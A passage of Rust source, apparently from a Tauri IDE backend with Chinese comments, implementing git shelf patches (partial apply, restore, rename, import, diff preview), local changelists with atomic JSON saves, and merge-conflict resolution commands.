    // 模式、字符串比对会误判，这类路径回退到逐文件探测。
    let ls_refs: Vec<&str> = cleaned.iter().map(|s| s.as_str()).collect();
    let tracked_out = git_output(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["-c", "core.quotepath=false", "ls-files", "-z", "--"])
            .args(&ls_refs),
    )
    .map_err(|e| format!("git ls-files failed: {}", e))?;
    if !tracked_out.status.success() {
        // 不再静默：批量判定失败意味着补丁里会缺未跟踪文件，必须让用户知道
        return Err(String::from_utf8_lossy(&tracked_out.stderr).to_string());
    }
    let tracked: std::collections::HashSet<String> = String::from_utf8_lossy(&tracked_out.stdout)
        .split('\0')
        .filter(|s| !s.is_empty())
        .map(normalize_ls_path)
        .collect();

    for p in &cleaned {
        let key = normalize_ls_path(p);
        let is_untracked = if key.contains(['*', '?', '[', '\\']) {
            // 通配名称：回退到逐文件探测，避免把已跟踪文件误判成未跟踪
            let probe = git_output(git_cmd().arg("-C").arg(&dir).args([
                "ls-files",
                "--error-unmatch",
                "--",
                p,
            ]))
            .map_err(|e| format!("git ls-files failed: {}", e))?;
            !probe.status.success()
        } else {
            !tracked.contains(&key)
        };
        if !is_untracked || !Path::new(&dir).join(p).is_file() {
            continue;
        }
        let null_dev = if cfg!(windows) { "NUL" } else { "/dev/null" };
        let no_index_args = [
            "diff",
            "--no-color",
            "--no-ext-diff",
            "--no-index",
            null_dev,
            p.as_str(),
        ];
        // --no-index 有差异时退出码为 1，run_git_diff 视为正常
        if let Ok(text) = run_git_diff(&dir, &no_index_args) {
            patch.push_str(&text);
        }
    }
    Ok(patch)
}

/// 应用贮藏补丁；paths 非空时仅应用这些文件（Unshelve 勾选文件用）
#[tauri::command]
pub fn git_apply_shelf_partial(
    repo_path: Option<String>,
    name: String,
    paths: Option<Vec<String>>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let file = shelf_file_path(&dir, &name)?;
    if !file.exists() {
        return Err(crate::error_proto::coded("stash_not_found", name.trim()));
    }
    let filter: Vec<String> = paths
        .unwrap_or_default()
        .iter()
        .map(|p| p.trim().to_string())
        .filter(|p| !p.is_empty())
        .collect();

    // 有路径过滤时不用 `git apply --include=`：
    // 该选项的 value 是 **fnmatch 通配符模式**，不是字面路径。
    // 文件名里字面含 `*` `?` `[` 时（合法文件名），模式会匹配到本不该
    // 恢复的文件，把用户没勾选的内容一并 apply。
    // 正确做法是按 paths 生成一个只含这些文件的临时补丁，再整体 apply。
    // 临时补丁用 RAII 持有：`?` 早退（git apply 失败等）也会删掉它，
    // 不会把用户源码的片段留在 /tmp
    let mut tmp_holder: Option<TempFile> = None;
    let patch_path = if filter.is_empty() {
        file.clone()
    } else {
        let full = fs::read_to_string(&file).map_err(|e| format!("读取失败: {}", e))?;
        let subset = filter_patch_by_paths(&full, &filter)?;
        if subset.trim().is_empty() {
            return Err("所选文件在该贮藏中没有可应用的差异".to_string());
        }
        let unique = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let tmp = TempFile::new(std::env::temp_dir().join(format!(
            "ide-shelf-partial-{}-{}.patch",
            std::process::id(),
            unique
        )));
        fs::write(tmp.path(), subset).map_err(|e| format!("写入失败: {}", e))?;
        let path = tmp.path().to_path_buf();
        tmp_holder = Some(tmp);
        path
    };

    let output = git_output_local(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["apply", "--whitespace=nowarn"])
            .arg(&patch_path),
    )
    .map_err(|e| format!("apply failed: {}", e))?;
    drop(tmp_holder);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// 从补丁文本中抽出只涉及 `paths` 中文件的 file section。
///
/// 补丁按 `diff --git` 段分割，段头的 b 侧路径（`+++ b/<path>`，删除侧是
/// `/dev/null` 则用 a 侧）与 paths 做规范化比较。逐段判定而非按路径名过滤：
/// 保留完整 hunk 才能让 `git apply` 正确落位。
fn filter_patch_by_paths(patch: &str, paths: &[String]) -> Result<String, String> {
    // 规范化比较键：去掉 `a/` `b/` 前缀、统一 `/`、忽略大小写
    let normalize = |p: &str| -> String {
        let trimmed = p.trim().trim_matches('"');
        let stripped = trimmed
            .strip_prefix("a/")
            .or_else(|| stripped_check(trimmed))
            .unwrap_or(trimmed);
        stripped.replace('\\', "/").to_lowercase()
    };
    let wanted: std::collections::HashSet<String> = paths.iter().map(|p| normalize(p)).collect();

    let mut out = String::new();
    let mut current: Vec<&str> = Vec::new();
    let mut keep_block = false;
    // 段头识别必须只在 hunk 之外生效：正文里「新增了一行 `++ x`」的输出恰好
    // 是 `+++ x`，按段头解析会把这一段的 keep_block 改错，从而静默丢掉整个
    // 文件段（勾选文件 Unshelve 什么都没恢复）。
    let mut in_hunk = false;

    for line in patch.lines() {
        if line.starts_with("diff --git ") {
            // 结算上一段
            if keep_block {
                out.push_str(&current.join("\n"));
                out.push('\n');
            }
            current.clear();
            keep_block = false;
            in_hunk = false;
            current.push(line);
            continue;
        }
        if current.is_empty() {
            // 补丁头（From / Subject 等元信息）暂存，遇到首个 diff 段前不算
            current.push(line);
            continue;
        }
        current.push(line);
        if line.starts_with("@@") {
            in_hunk = true;
        }
        if in_hunk {
            continue;
        }
        if let Some(rest) = line.strip_prefix("+++ ") {
            // `+++ /dev/null` 表示删除侧：改用 a 侧路径判定
            let path = if rest.trim() == "/dev/null" {
                current
                    .iter()
                    .rev()
                    .find_map(|l| l.strip_prefix("--- "))
                    .map(|p| p.trim())
                    .unwrap_or("")
            } else {
                rest
            };
            keep_block = wanted.contains(&normalize(path));
        }
    }
    if keep_block {
        out.push_str(&current.join("\n"));
        out.push('\n');
    }
    Ok(out)
}

/// 辅助：去掉 `b/` 前缀（`a/` 与 `b/` 任一命中即可）。
fn stripped_check(s: &str) -> Option<&str> {
    s.strip_prefix("b/")
}

/// 列出「最近删除」中的贮藏架条目
#[tauri::command]
pub fn git_list_deleted_shelves(repo_path: Option<String>) -> Result<Vec<ShelfDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let dir_path = deleted_shelves_dir(&dir);
    let mut shelves = Vec::new();
    let entries = match fs::read_dir(&dir_path) {
        Ok(e) => e,
        Err(_) => return Ok(shelves),
    };
    for entry in entries.flatten() {
        let meta = match entry.metadata() {
            Ok(m) => m,
            Err(_) => continue,
        };
        let raw = entry.file_name().to_string_lossy().to_string();
        let Some(_name) = raw.strip_suffix(".patch") else {
            continue;
        };
        let display_name = shelf_name_of(&raw);
        let date = meta
            .modified()
            .ok()
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| format_unix_date(d.as_secs() as i64))
            .unwrap_or_default();
        let files = fs::read_to_string(entry.path())
            .map(|text| patch_files(&text))
            .unwrap_or_default();
        shelves.push(ShelfDto {
            name: display_name,
            date,
            files,
        });
    }
    shelves.sort_by(|a, b| b.name.cmp(&a.name));
    Ok(shelves)
}

/// 从「最近删除」中恢复贮藏架条目
#[tauri::command]
pub fn git_restore_shelf(repo_path: Option<String>, name: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let active_file = shelf_file_path(&dir, &name)?;
    let del_file = deleted_shelf_file_path(&dir, &name)?;
    if !del_file.exists() {
        return Err(crate::error_proto::coded("stash_not_found", name.trim()));
    }
    let active_dir = shelves_dir(&dir);
    let _ = fs::create_dir_all(&active_dir);
    if fs::rename(&del_file, &active_file).is_err() {
        if fs::copy(&del_file, &active_file).is_ok() {
            let _ = fs::remove_file(&del_file);
        } else {
            return Err("恢复搁置失败".to_string());
        }
    }
    Ok(format!("已恢复搁置 {}", name.trim()))
}

/// 重命名贮藏架条目
#[tauri::command]
pub fn git_rename_shelf(
    repo_path: Option<String>,
    old_name: String,
    new_name: String,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let old_file = shelf_file_path(&dir, &old_name)?;
    let new_file = shelf_file_path(&dir, &new_name)?;
    if !old_file.exists() {
        return Err(crate::error_proto::coded(
            "stash_not_found",
            old_name.trim(),
        ));
    }
    if new_file.exists() && old_file != new_file {
        return Err("已存在同名的搁置".to_string());
    }
    fs::rename(&old_file, &new_file).map_err(|e| format!("重命名失败: {}", e))?;
    Ok(format!("已重命名为 {}", new_name.trim()))
}

/// 从贮藏架补丁中移除单个文件；若已无文件则直接删除该贮藏
#[tauri::command]
pub fn git_delete_shelf_file(
    repo_path: Option<String>,
    name: String,
    path: String,
) -> Result<String, String> {
    let dir = repo_path.clone().unwrap_or_else(|| ".".to_string());
    let file = shelf_file_path(&dir, &name)?;
    if !file.exists() {
        return Err(crate::error_proto::coded("stash_not_found", name.trim()));
    }
    let full = fs::read_to_string(&file).map_err(|e| format!("读取失败: {}", e))?;
    let all_files = patch_files(&full);
    let remaining: Vec<String> = all_files
        .into_iter()
        .filter(|f| f.trim() != path.trim())
        .collect();
    if remaining.is_empty() {
        return git_delete_shelf(repo_path, name);
    }
    let new_patch = filter_patch_by_paths(&full, &remaining)?;
    fs::write(&file, new_patch).map_err(|e| format!("写入失败: {}", e))?;
    Ok(format!("已从搁置中移除文件 {}", path.trim()))
}

/// 从贮藏架补丁中移除多个文件；若已无文件则直接删除该贮藏
#[tauri::command]
pub fn git_delete_shelf_files(
    repo_path: Option<String>,
    name: String,
    paths: Vec<String>,
) -> Result<String, String> {
    let dir = repo_path.clone().unwrap_or_else(|| ".".to_string());
    let file = shelf_file_path(&dir, &name)?;
    if !file.exists() {
        return Err(crate::error_proto::coded("stash_not_found", name.trim()));
    }
    let full = fs::read_to_string(&file).map_err(|e| format!("读取失败: {}", e))?;
    let all_files = patch_files(&full);
    let to_remove: std::collections::HashSet<String> =
        paths.into_iter().map(|p| p.trim().to_string()).collect();
    let remaining: Vec<String> = all_files
        .into_iter()
        .filter(|f| !to_remove.contains(f.trim()))
        .collect();
    if remaining.is_empty() {
        return git_delete_shelf(repo_path, name);
    }
    let new_patch = filter_patch_by_paths(&full, &remaining)?;
    fs::write(&file, new_patch).map_err(|e| format!("写入失败: {}", e))?;
    Ok(format!("已从搁置中移除 {} 个文件", to_remove.len()))
}

/// 读取贮藏架补丁文本（可按单文件或多文件过滤）
#[tauri::command]
pub fn git_read_shelf_patch(
    repo_path: Option<String>,
    name: String,
    path: Option<String>,
    paths: Option<Vec<String>>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let file = shelf_file_path(&dir, &name)?;
    let patch_file = if file.exists() {
        file
    } else {
        let del = deleted_shelf_file_path(&dir, &name)?;
        if del.exists() {
            del
        } else {
            return Err(crate::error_proto::coded("stash_not_found", name.trim()));
        }
    };
    let full = fs::read_to_string(&patch_file).map_err(|e| format!("读取补丁失败: {}", e))?;
    if let Some(target_paths) = paths.filter(|p| !p.is_empty()) {
        filter_patch_by_paths(&full, &target_paths)
    } else if let Some(target_file) = path.filter(|p| !p.trim().is_empty()) {
        filter_patch_by_paths(&full, &[target_file])
    } else {
        Ok(full)
    }
}

/// 导入外部补丁文件到贮藏架
#[tauri::command]
pub fn git_import_shelf_patch(
    repo_path: Option<String>,
    patch_path: String,
    name: Option<String>,
    registry: tauri::State<'_, WorkspaceRegistry>,
    grants: tauri::State<'_, PathGrantRegistry>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let src = if let Ok(path) = authorize_workspace_path(&registry, &patch_path, false) {
        path
    } else if grants.is_granted(Path::new(&patch_path)) {
        PathBuf::from(&patch_path)
    } else {
        return Err(crate::error_proto::coded(
            "path_outside_workspace",
            &patch_path,
        ));
    };
    if !src.exists() {
        return Err("补丁文件不存在".to_string());
    }
    let content = fs::read_to_string(&src).map_err(|e| format!("读取补丁文件失败: {}", e))?;
    if content.trim().is_empty() {
        return Err("补丁文件内容为空".to_string());
    }
    let shelf_name = match name.filter(|n| !n.trim().is_empty()) {
        Some(n) => n,
        None => src
            .file_stem()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| "Imported Patch".to_string()),
    };
    git_shelve_save(Some(dir), shelf_name, content)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct ShelfPreviewDto {
    pub old_path: String,
    pub new_path: String,
    pub title: String,
}

/// 为搁置文件生成双侧比对预览临时文件并授权
#[tauri::command]
pub fn git_shelf_diff_preview(
    repo_path: Option<String>,
    name: String,
    path: String,
    compare_with_local: bool,
    grants: tauri::State<'_, PathGrantRegistry>,
) -> Result<ShelfPreviewDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let patch = git_read_shelf_patch(Some(dir.clone()), name.clone(), Some(path.clone()), None)?;
    if patch.trim().is_empty() {
        return Err("未找到该文件的搁置差异".to_string());
    }

    let base_content = {
        let mut cmd = git_cmd();
        cmd.arg("-C")
            .arg(&dir)
            .args(["-c", "core.quotepath=false", "show"])
            .arg(format!("HEAD:{}", path.trim()));
        match run_with_timeout_spawn(&mut cmd, Duration::from_secs(5)) {
            Ok(out) if out.status.success() => String::from_utf8_lossy(&out.stdout).into_owned(),
            _ => String::new(),
        }
    };

    let tmp_root = shelves_dir(&dir).join(".preview").join(&name);
    let _ = fs::create_dir_all(&tmp_root);

    let mut init_cmd = git_cmd();
    init_cmd.arg("-C").arg(&tmp_root).args(["init", "-q"]);
    let init_res = run_with_timeout_spawn(&mut init_cmd, Duration::from_secs(5));
    if let Err(e) = init_res {
        return Err(format!("初始化预览失败: {}", e));
    }

    let target_file_in_tmp = tmp_root.join(path.trim());
    if let Some(parent) = target_file_in_tmp.parent() {
        let _ = fs::create_dir_all(parent);
    }
    if !base_content.is_empty() {
        fs::write(&target_file_in_tmp, &base_content)
            .map_err(|e| format!("写入基础文件失败: {e}"))?;
        let mut add_cmd = git_cmd();
        add_cmd
            .arg("-C")
            .arg(&tmp_root)
            .args(["add", "--", path.trim()]);
        let add_res = run_with_timeout_spawn(&mut add_cmd, Duration::from_secs(5));
        if let Err(e) = add_res {
            return Err(format!("添加预览文件失败: {}", e));
        }
    }

    let tmp_patch = tmp_root.join("shelf.patch");
    fs::write(&tmp_patch, &patch).map_err(|e| format!("写入预览补丁失败: {e}"))?;
    let mut apply_cmd = git_cmd();
    apply_cmd
        .arg("-C")
        .arg(&tmp_root)
        .args(["apply", "--whitespace=nowarn", "shelf.patch"]);
    let apply_res = run_with_timeout_spawn(&mut apply_cmd, Duration::from_secs(5));
    if let Err(e) = apply_res {
        return Err(format!("应用预览补丁失败: {}", e));
    }

    let shelved_content =
        fs::read_to_string(&target_file_in_tmp).unwrap_or_else(|_| base_content.clone());

    let preview_dir = tmp_root.join("preview");
    let _ = fs::create_dir_all(&preview_dir);
    let file_name = Path::new(path.trim())
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or("file");

    let (old_file, new_file, title) = if compare_with_local {
        let old_f = preview_dir.join(format!("shelved_{}", file_name));
        fs::write(&old_f, &shelved_content).map_err(|e| format!("写入预览文件失败: {e}"))?;
        let local_path = Path::new(&dir).join(path.trim());
        let new_f = if local_path.is_file() {
            local_path
        } else {
            // 本地工作区尚无该文件（如搁置的是新增文件或本地已被删除）：创建临时空文件比对，避免 not_a_file
            let local_empty = preview_dir.join(file_name);
            fs::write(&local_empty, "").map_err(|e| format!("写入本地空文件失败: {e}"))?;
            local_empty
        };
        (
            old_f,
            new_f,
            format!("Shelf: {} ↔ Local: {}", name, file_name),
        )
    } else {
        let old_f = preview_dir.join(format!("base_{}", file_name));
        let new_f = preview_dir.join(format!("shelved_{}", file_name));
        fs::write(&old_f, &base_content).map_err(|e| format!("写入基础文件失败: {e}"))?;
        fs::write(&new_f, &shelved_content).map_err(|e| format!("写入搁置文件失败: {e}"))?;
        (old_f, new_f, format!("Shelf: {} ({})", name, file_name))
    };

    grants.grant(&old_file);
    grants.grant(&new_file);

    Ok(ShelfPreviewDto {
        old_path: old_file.to_string_lossy().into_owned(),
        new_path: new_file.to_string_lossy().into_owned(),
        title,
    })
}

// ============ 本地变更列表（Changelist，存于 .git/ide-changelists.json） ============

pub const DEFAULT_CHANGELIST: &str = "Changes";

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct ChangelistsDto {
    /// 变更列表名集合，首项恒为默认列表 Changes
    pub lists: Vec<String>,
    /// 路径 → 列表名；不在表中的路径属于默认列表
    pub files: std::collections::HashMap<String, String>,
}

fn changelists_path(repo_path: &str) -> PathBuf {
    Path::new(repo_path)
        .join(".git")
        .join("ide-changelists.json")
}

fn load_changelists(repo_path: &str) -> ChangelistsDto {
    let fallback = ChangelistsDto {
        lists: vec![DEFAULT_CHANGELIST.to_string()],
        files: std::collections::HashMap::new(),
    };
    let path = changelists_path(repo_path);
    let text = match fs::read_to_string(&path) {
        Ok(t) => t,
        Err(_) => return fallback,
    };
    match serde_json::from_str(&text) {
        Ok(dto) => dto,
        Err(e) => {
            // 解析失败不能就这么把文件原地覆盖掉：用户手工维护的文件分组会
            // 无提示丢失。先把损坏内容另存为 .corrupt.bak（保留现场），
            // 再回退到默认列表 —— 后续保存写的是新文件，备份不会被覆盖。
            let backup = path.with_extension("json.corrupt.bak");
            log::warn!("变更列表解析失败，已备份到 {}: {}", backup.display(), e);
            if let Err(rename_err) = fs::rename(&path, &backup) {
                log::warn!("备份损坏的变更列表失败: {}", rename_err);
            }
            fallback
        }
    }
}

/// 原子写入变更列表：同目录临时文件 + `rename` 替换。
///
/// `fs::write` 直接覆盖有两个后果：多窗口并发 `changelist_assign` 时后写覆盖
/// 先写；进程恰好在「截断」与「写完」之间退出会留下半截 JSON，下次加载静默
/// 回退到默认列表（用户的分组丢失且被覆盖）。同目录 rename 在文件系统层面
/// 是原子的，读者要么看到旧内容、要么看到新内容。
fn save_changelists(repo_path: &str, dto: &ChangelistsDto) -> Result<(), String> {
    let path = changelists_path(repo_path);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| format!("创建目录失败: {}", e))?;
    }
    let text = serde_json::to_string_pretty(dto).map_err(|e| format!("序列化失败: {e}"))?;
    // 临时名带纳秒时间戳：只用进程 id 时，同一进程内两个窗口的并发
    // changelist_* 命令会写同一个 .json.tmp.<pid> —— 后写者先覆盖前者，
    // 两者再各自 rename，最终只有一份修改落盘，另一份静默丢失。
    let unique = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let suffix = format!("json.tmp.{}.{}", std::process::id(), unique);
    let tmp = TempFile::new(path.with_extension(suffix));
    fs::write(tmp.path(), text).map_err(|e| format!("写入失败: {}", e))?;
    fs::rename(tmp.path(), &path).map_err(|e| format!("写入失败: {}", e))
}

#[tauri::command]
pub async fn changelists_load(repo_path: Option<String>) -> Result<ChangelistsDto, String> {
    // 提交抽屉每次打开都要读一次变更列表文件；文件 IO 不该占住 ipc worker。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        Ok(load_changelists(&dir))
    })
    .await
    .map_err(|e| format!("changelists_load 任务失败: {e}"))?
}

#[tauri::command]
pub fn changelist_create(
    repo_path: Option<String>,
    name: String,
) -> Result<ChangelistsDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let name = name.trim();
    if name.is_empty() {
        return Err("变更列表名称不能为空".to_string());
    }
    let mut dto = load_changelists(&dir);
    if dto.lists.iter().any(|l| l == name) {
        return Err(crate::error_proto::coded("changelist_already_exists", name));
    }
    dto.lists.push(name.to_string());
    save_changelists(&dir, &dto)?;
    Ok(dto)
}

/// 删除变更列表：rollback=true 时其下文件执行 Rollback（还原未提交更改），
/// 否则这些文件移回默认列表（清除指派即可）。默认列表不可删除。
///
/// rollback 的顺序刻意是「先落盘删列表，再逐个回滚文件」：
/// 反序（先回滚再删列表）在某个文件回滚失败时会把用户置于
/// 「前几个文件的修改已被不可恢复地丢弃，但列表还在、dto 也没更新」的
/// 半完成状态，用户看到「删除失败」却已有文件被毁。
/// 先落盘保证列表一定消失；回滚失败只影响那些文件的未提交更改，
/// 用户可对单个文件再点 Rollback 重试。
#[tauri::command]
pub fn changelist_delete(
    repo_path: Option<String>,
    name: String,
    rollback: bool,
) -> Result<ChangelistsDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let name = name.trim();
    if name == DEFAULT_CHANGELIST {
        return Err("默认变更列表 Changes 不能删除".to_string());
    }
    let mut dto = load_changelists(&dir);
    if !dto.lists.iter().any(|l| l == name) {
        return Err(crate::error_proto::coded("changelist_not_found", name));
    }
    let affected: Vec<String> = dto
        .files
        .iter()
        .filter(|(_, l)| l.as_str() == name)
        .map(|(p, _)| p.clone())
        .collect();

    dto.lists.retain(|l| l != name);
    for p in &affected {
        dto.files.remove(p);
    }
    save_changelists(&dir, &dto)?;

    if rollback {
        // 批量判定 HEAD 成员，省掉逐文件 `git cat-file -e`（见 head_path_set）。
        // 判定不了的路径回退到单文件探测，语义与之前逐文件回滚一致。
        let keys: Vec<String> = affected
            .iter()
            .map(|p| to_repo_relative(&dir, p).unwrap_or_else(|_| p.trim().replace('\\', "/")))
            .collect();
        let head_paths = head_path_set(&dir, &keys);

        let mut failures: Vec<String> = Vec::new();
        for (p, key) in affected.iter().zip(keys.iter()) {
            // 批量查询失败（None）时逐文件探测，语义与改动前一致
            let hint = head_paths
                .as_ref()
                .and_then(|set| head_membership(set, key));
            if let Err(e) = git_discard_file_changes_impl(&dir, p, hint) {
                failures.push(format!("{}: {}", p, e));
            }
        }
        if !failures.is_empty() {
            // 列表已删除（状态一致），但部分文件没回滚成功：如实报告，
            // 让用户知道还有哪些改动需要手动处理。
            return Err(format!(
                "变更列表已删除，但 {} 个文件回滚失败（改动仍在，可手动 Rollback）：{}",
                failures.len(),
                failures.join("; ")
            ));
        }
    }
    Ok(dto)
}

/// 把文件指派到变更列表；list 为默认列表时清除指派
#[tauri::command]
pub fn changelist_assign(
    repo_path: Option<String>,
    paths: Vec<String>,
    list: String,
) -> Result<ChangelistsDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let list = list.trim();
    let mut dto = load_changelists(&dir);
    if list != DEFAULT_CHANGELIST && !dto.lists.iter().any(|l| l == list) {
        return Err(crate::error_proto::coded("changelist_not_found", list));
    }
    for p in &paths {
        let p = p.trim();
        if p.is_empty() {
            continue;
        }
        if list == DEFAULT_CHANGELIST {
            dto.files.remove(p);
        } else {
            dto.files.insert(p.to_string(), list.to_string());
        }
    }
    save_changelists(&dir, &dto)?;
    Ok(dto)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct MergeFileContentDto {
    pub path: String,
    /// 冲突种类：content=正文三方冲突；deleted_by_us=我方删除对方修改（DU；
    /// 无 stage 2）；deleted_by_them=对方删除我方修改（UD；无 stage 3）；
    /// resolved=index 里已无未合并条目（外部已解决，UI 应将其移出列表）。
    /// PyCharm 对删改冲突不开三窗格，只给"保留删除 / 保留修改"文件级选项。
    pub kind: String,
    /// 冲突三方的文件内容；base 在无共同祖先（add/add）时为 None。
    /// 删改冲突只填存活的一方，另一方为空串。
    pub base: Option<String>,
    pub ours: String,
    pub theirs: String,
    /// 工作区当前内容（含冲突标记），作为结果编辑器的初始值
    pub worktree: String,
}

/// 读取冲突文件：先看 index 里该路径的未合并 stage，再决定取哪些 blob。
/// 旧实现盲取 :2:/:3:，删改冲突（DU/UD 缺一边）直接把 git 原文 fatal
/// 抛给前端 —— 对话框满屏红字、右侧"已解决也读不出"，即用户截图的症状。
#[tauri::command]
pub async fn git_merge_file_content(
    repo_path: Option<String>,
    path: String,
) -> Result<MergeFileContentDto, String> {
    // 三方内容 = ls-files + git show 若干次 + 读工作区文件，同步执行会占住 ipc worker。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        let rel = to_repo_relative(&dir, path.trim())?;
        ensure_safe_git_path(&rel)?;

        // 该路径在 index 里的未合并 stage 集合（"1 README.md" 这种行）。
        let ls = git_output(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["ls-files", "-u", "--", &rel]),
        )
        .map_err(|e| format!("git ls-files failed: {}", e))?;
        if !ls.status.success() {
            return Err(String::from_utf8_lossy(&ls.stderr).trim().to_string());
        }
        let mut stages = std::collections::HashSet::new();
        for line in String::from_utf8_lossy(&ls.stdout).lines() {
            // "<mode> <hash> <stage>\t<path>"：stage 在 hash 后的第一段
            let stage = line.split_whitespace().nth(2).unwrap_or("");
            stages.insert(stage.to_string());
        }

        // 一个未合并条目都没有：文件已在外部解决（add 过）或根本不在冲突中。
        // 报 resolved 让 UI 把它移出列表，而不是喷 fatal。
        if stages.is_empty() {
            let worktree = read_repo_worktree_text(&dir, &rel);
            return Ok(MergeFileContentDto {
                path: rel,
                kind: "resolved".to_string(),
                base: None,
                ours: String::new(),
                theirs: String::new(),
                worktree,
            });
        }

        let show = |stage: &str| -> Result<String, String> {
            let out = git_output(
                git_cmd()
                    .arg("-C")
                    .arg(&dir)
                    .args(["show", &format!(":{stage}:{rel}")]),
            )
            .map_err(|e| format!("git show failed: {}", e))?;
            if !out.status.success() {
                return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
            }
            Ok(String::from_utf8_lossy(&out.stdout).to_string())
        };

        let has_ours = stages.contains("2");
        let has_theirs = stages.contains("3");
        // 一边被删：只取存活方 + base（base 缺失也接受，如单边新增后对面删除）。
        if !has_ours || !has_theirs {
            let ours = if has_ours { show("2")? } else { String::new() };
            let theirs = if has_theirs {
                show("3")?
            } else {
                String::new()
            };
            let base = show("1").ok();
            let worktree = read_repo_worktree_text(&dir, &rel);
            return Ok(MergeFileContentDto {
                path: rel,
                kind: if has_ours {
                    "deleted_by_them".to_string()
                } else {
                    "deleted_by_us".to_string()
                },
                base,
                ours,
                theirs,
                worktree,
            });
        }

        let ours = show("2")?;
        let theirs = show("3")?;
        let base = show("1").ok();

        let worktree = read_repo_worktree_text(&dir, &rel);

        Ok(MergeFileContentDto {
            path: rel,
            kind: "content".to_string(),
            base,
            ours,
            theirs,
            worktree,
        })
    })
    .await
    .map_err(|e| format!("git_merge_file_content 任务失败: {e}"))?
}

/// git add 的同步实现：命令本体与 git_use_merge_side 共用。
fn git_stage_file_impl(repo_path: Option<String>, path: &str) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output_local(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["add", "--", path.trim()]),
    )
    .map_err(|e| format!("git add failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 标记冲突已解决（git add）
#[tauri::command]
pub async fn git_stage_file(repo_path: Option<String>, path: String) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || git_stage_file_impl(repo_path, &path))
        .await
        .map_err(|e| format!("git_stage_file 任务失败: {e}"))?
}

/// 冲突文件直接采用一方：有 blob 的一方走（git checkout --ours|--theirs + add）；
/// 缺 stage 的一方（删改冲突里被删的那边）没有 blob 可检出，语义是"确认删除"，
/// 走 `git rm` 把删除暂存 —— 旧实现一律 checkout，DU 下 Accept Ours 直接喷
/// `error: path ... does not have our version`（已实测）。
/// 路径已无未合并条目（外部已解决）时拒绝：此时 git rm 会删掉正常文件。
#[tauri::command]
pub async fn git_use_merge_side(
    repo_path: Option<String>,
    path: String,
    side: String,
) -> Result<String, String> {
    let want_ours = match side.as_str() {
        "ours" => true,
        "theirs" => false,
        other => return Err(crate::error_proto::coded("unknown_merge_side", other)),
    };
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.clone().unwrap_or_else(|| ".".to_string());
        let rel = path.trim().to_string();
        // 先看哪边有 stage：一次 ls-files，避免对着空气 checkout。
        let ls = git_output(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["ls-files", "-u", "--", &rel]),
        )
        .map_err(|e| format!("git ls-files failed: {}", e))?;
        if !ls.status.success() {
            return Err(String::from_utf8_lossy(&ls.stderr).trim().to_string());
        }
        let mut stages = std::collections::HashSet::new();
        for line in String::from_utf8_lossy(&ls.stdout).lines() {
            let stage = line.split_whitespace().nth(2).unwrap_or("");
            stages.insert(stage.to_string());
        }
        if stages.is_empty() {
            // 已无未合并条目：文件在外部已被解决，此时 git rm 会删正常文件，
            // 必须拒绝。前端收到 kind=resolved 本不会走到这里，此为兜底。
            return Err(crate::error_proto::coded("conflict_not_found", &rel));
        }
        let needed = if want_ours { "2" } else { "3" };
        if !stages.contains(needed) {
            // 缺 stage = 采用"删除"那一边：git rm 暂存删除，即解决。
            let rm = git_output_local(git_cmd().arg("-C").arg(&dir).args(["rm", "--", &rel]))
                .map_err(|e| format!("git rm failed: {}", e))?;
            if !rm.status.success() {
                return Err(String::from_utf8_lossy(&rm.stderr).trim().to_string());
            }
            return Ok(String::from_utf8_lossy(&rm.stdout).to_string());
        }
        let flag = if want_ours { "--ours" } else { "--theirs" };
        let checkout = git_output_local(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["checkout", flag, "--", &rel]),
        )
        .map_err(|e| format!("checkout failed: {}", e))?;
        if !checkout.status.success() {
            return Err(String::from_utf8_lossy(&checkout.stderr).trim().to_string());
        }
        git_stage_file_impl(repo_path, &rel)
    })
    .await
    .map_err(|e| format!("git_use_merge_side 任务失败: {e}"))?
}

/// 该路径在 index 里的未合并 stage 集合（"1"/"2"/"3"）。
